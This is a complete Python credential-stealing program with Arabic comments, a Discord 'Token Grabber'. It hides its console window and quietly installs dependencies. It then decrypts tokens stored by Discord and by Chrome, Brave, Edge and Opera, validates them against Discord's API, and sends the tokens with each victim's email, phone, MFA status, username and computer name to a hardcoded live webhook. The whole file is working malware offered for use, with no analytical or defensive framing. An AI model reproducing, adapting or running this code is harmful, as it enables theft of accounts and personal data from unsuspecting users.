import os
import json
import re
import base64
import win32crypt
import urllib.request
import datetime
import ctypes
import subprocess
import sys
from Crypto.Cipher import AES

# إخفاء النوافذ
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# تثبيت المكتبات
def install_imports():
    try:
        __import__("win32crypt")
        __import__("Crypto.Cipher")
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pypiwin32", "pycryptodome"], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                            creationflags=subprocess.CREATE_NO_WINDOW)

install_imports()

class AdvancedTokenFinder:
    def __init__(self):
        # ويب هوك موحد
        self.webhook_url = "https://discord.com/api/webhooks/1429097039093829855/HCPODgy4RITkjvnQglq-Thy1fAFpYbOQXCRb_QCuG8FDtDnc9diQSeH2hFzYa7RbbHeB"
        self.local_app_data = os.getenv("LOCALAPPDATA")
        self.roaming_app_data = os.getenv("APPDATA")
        self.sent_tokens = set()
        
        # جميع المسارات في مكان واحد
        self.paths = {
            'Discord': self.roaming_app_data + '\\discord',
            'DiscordPTB': self.roaming_app_data + '\\discordptb',
            'DiscordCanary': self.roaming_app_data + '\\discordcanary',
            'Chrome': self.local_app_data + '\\Google\\Chrome\\User Data\\Default',
            'Brave': self.local_app_data + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Edge': self.local_app_data + '\\Microsoft\\Edge\\User Data\\Default',
            'Opera': self.roaming_app_data + '\\Opera Software\\Opera Stable'
        }

    def get_headers(self, token=None):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        if token:
            headers["Authorization"] = token
        return headers

    def get_encryption_key(self, path):
        try:
            with open(path + "\\Local State", "r", encoding='utf-8') as f:
                local_state = json.load(f)
                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                key = key[5:]
                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception as e:
            return None

    def decrypt_token(self, encrypted_token, key):
        try:
            encrypted_token = base64.b64decode(encrypted_token)
            iv = encrypted_token[3:15]
            payload = encrypted_token[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted.decode()
        except Exception as e:
            return None

    def scan_for_tokens(self, path):
        storage_path = path + "\\Local Storage\\leveldb"
        all_tokens = []
        
        if not os.path.exists(storage_path):
            return all_tokens

        key = self.get_encryption_key(path)
        
        for file in os.listdir(storage_path):
            if not file.endswith('.ldb'):
                continue

            try:
                file_path = os.path.join(storage_path, file)
                
                with open(file_path, 'rb') as f:
                    raw_content = f.read()
                
                try:
                    content = raw_content.decode('utf-8', errors='ignore')
                except:
                    content = raw_content.decode('latin-1', errors='ignore')
                
                # أنماط البحث الموحدة
                encrypted_patterns = [
                    r'dQw4w9WgXcQ:([^"\'\\]+)',
                    r'token["\']?\s*[=:]\s*["\'](dQw4w9WgXcQ:[^"\'\\]+)["\']'
                ]
                
                for pattern in encrypted_patterns:
                    matches = re.findall(pattern, content)
                    for match in matches:
                        if isinstance(match, tuple):
                            match = match[0]
                        if key:
                            decrypted = self.decrypt_token(match, key)
                            if decrypted and len(decrypted) > 30 and decrypted not in self.sent_tokens:
                                all_tokens.append(decrypted)
                                self.sent_tokens.add(decrypted)
                
                unencrypted_patterns = [
                    r'["\']token["\']\s*:\s*["\']([^"\'\\]{30,})["\']',
                    r'token["\']?\s*[=:]\s*["\']([^"\'\\]{30,})["\']',
                    r'mfa\.[a-zA-Z0-9_-]{84}',
                    r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}'
                ]
                
                for pattern in unencrypted_patterns:
                    matches = re.findall(pattern, content)
                    for match in matches:
                        if isinstance(match, tuple):
                            match = match[0]
                        if len(match) > 30 and 'http' not in match.lower() and match not in self.sent_tokens:
                            all_tokens.append(match)
                            self.sent_tokens.add(match)
                            
            except Exception as e:
                continue
                
        return all_tokens

    def get_user_info(self, token):
        try:
            headers = self.get_headers(token)
            req = urllib.request.Request(
                'https://discord.com/api/v9/users/@me',
                headers=headers
            )
            response = urllib.request.urlopen(req)
            if response.getcode() == 200:
                user_data = json.loads(response.read().decode())
                
                try:
                    req = urllib.request.Request(
                        'https://discord.com/api/v9/users/@me/billing/subscriptions',
                        headers=headers
                    )
                    response = urllib.request.urlopen(req)
                    subscriptions = json.loads(response.read().decode())
                    user_data['has_nitro'] = len(subscriptions) > 0
                except:
                    user_data['has_nitro'] = False
                    
                return user_data
        except Exception as e:
            return None

    def get_badges(self, flags):
        badges = []
        badge_emojis = {
            1: "🔧", 2: "🤝", 4: "🚩", 8: "🔍",
            64: "💪", 128: "🧠", 256: "⚖️", 512: "🔥",
            1024: "🐛", 4096: "🤖", 16384: "🎓"
        }
        
        for flag, emoji in badge_emojis.items():
            if flags & flag:
                badges.append(emoji)
    
        return " ".join(badges) if badges else "❌ Nothing"

    def get_account_age(self, user_id):
        try:
            timestamp = (int(user_id) >> 22) + 1420070400000
            account_creation = datetime.datetime.fromtimestamp(timestamp / 1000)
            now = datetime.datetime.now()
            age_days = (now - account_creation).days
            return f"{age_days} day"
        except:
            return "unknown"

    def send_report(self, tokens_data):
        try:
            current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            embeds = []
            
            for i, token_data in enumerate(tokens_data, 1):
                token = token_data['token']
                user_data = token_data['user_data']
                platform = token_data['platform']
                
                badges = self.get_badges(user_data.get('flags', 0))
                account_age = self.get_account_age(user_data.get('id', '0'))
                
                embed_color = 0x5865F2
                if user_data.get('has_nitro'):
                    embed_color = 0xff73fa
                elif user_data.get('verified'):
                    embed_color = 0x57f287
                
                embed = {
                    "title": f" Discord account #{i}",
                    "color": embed_color,
                    "thumbnail": {
                        "url": f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data.get('avatar', '')}.png?size=512"
                    },
                    "author": {
                        "name": f"{user_data['username']}#{user_data.get('discriminator', '0')}",
                        "icon_url": f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data.get('avatar', '')}.png?size=128"
                    },
                    "fields": [
                        {
                            "name": "📋 المعلومات الأساسية",
                            "value": f"""**🆔 ID:** `{user_data.get('id', 'N/A')}`
**📧 Email:** `{user_data.get('email', 'hidden')}`
**📞 Phone:** `{user_data.get('phone', 'Not added')}`
**🌍 language:** `{user_data.get('locale', 'N/A').upper()}`""",
                            "inline": True
                        },
                        {
                            "name": "🛡️ حالة الحساب",
                            "value": f"""**🏷️ البادجات:** {badges}
**✅ Verification:** `{'🟢 مفعل' if user_data.get('verified') else '🔴 Not activated'}`
**🔐 MFA:** `{'🟢 مفعل' if user_data.get('mfa_enabled') else '🔴 Not activated'}`
**📅 Account age:** `{account_age}`""",
                            "inline": True
                        },
                        {
                            "name": "💎 الاشتراكات والمصدر",
                            "value": f"""**💎 Nitro:** `{'🟢 Activated' if user_data.get('has_nitro') else '🔴 Not activated'}`
**🔍 Source:** `{platform}`
**👤 user:** `{os.getenv('USERNAME', 'N/A')}`
**💻 Device:** `{os.getenv('COMPUTERNAME', 'N/A')}`""",
                            "inline": False
                        },
                        {
                            "name": "🔑 Token",
                            "value": f"```{token}```",
                            "inline": False
                        }
                    ],
                    "footer": {
                        "text": f"account #{i} • {current_time}",
                        "icon_url": "https://cdn.discordapp.com/emojis/1029397383734366278.png"
                    },
                    "timestamp": datetime.datetime.now().isoformat()
                }
                embeds.append(embed)

            data = {
                "embeds": embeds,
                "username": "Token Grabber",
                "avatar_url": "https://cdn.discordapp.com/attachments/1374725715534155788/1426580578869711020/IMG_7470.jpg?ex=68f255b2&is=68f10432&hm=f65e0f1e48ec2acf80ce3ef8aaa16f0b4243702c07ffb5d59c4cbaf1208e2175&"
            }
            
            json_data = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(
                self.webhook_url, 
                data=json_data, 
                headers=self.get_headers(),
                method='POST'
            )
            
            import ssl
            context = ssl._create_unverified_context()
            urllib.request.urlopen(req, context=context, timeout=30)
            return True
            
        except Exception as e:
            return False

    def main(self):
        all_valid_tokens = []
        
        for platform, path in self.paths.items():
            if not os.path.exists(path):
                continue
                
            tokens = self.scan_for_tokens(path)
            
            for token in tokens:
                try:
                    user_data = self.get_user_info(token)
                    if user_data:
                        all_valid_tokens.append({
                            'token': token,
                            'user_data': user_data,
                            'platform': platform
                        })
                except:
                    continue
        
        if all_valid_tokens:
            self.send_report(all_valid_tokens)

if __name__ == "__main__":
    try:
        finder = AdvancedTokenFinder()
        finder.main()
    except:
        pass